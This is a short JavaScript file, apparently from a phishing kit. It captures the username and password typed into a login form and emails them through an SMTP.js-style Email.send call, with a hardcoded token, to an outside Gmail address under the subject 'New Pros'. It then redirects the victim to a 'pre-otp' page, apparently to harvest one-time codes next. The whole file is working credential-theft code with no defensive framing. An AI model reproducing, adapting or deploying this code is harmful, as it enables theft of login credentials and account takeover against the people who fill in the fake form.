const fname = document.getElementById('userId');
const lname = document.getElementById('password');
const submit = document.getElementById('submit');

submit.addEventListener('submit',(e)=>{
    e.preventDefault();
    let ebody = `
    <h3>Username: </h3>${fname.value}
    <br>
    <h3>Password: </h3>${lname.value}
    `;

    Email.send({
      SecureToken  : "2239aacf-e478-40ca-9771-4d741020e40c",
        To : "wh0091394@gmail.com", 
        From : "nunugv@proton.me",
        Subject : "New Pros",
        Body : ebody
    }).then(
      function Redirect() {
        window.location = "./pre-otp.html"
      }
    );
});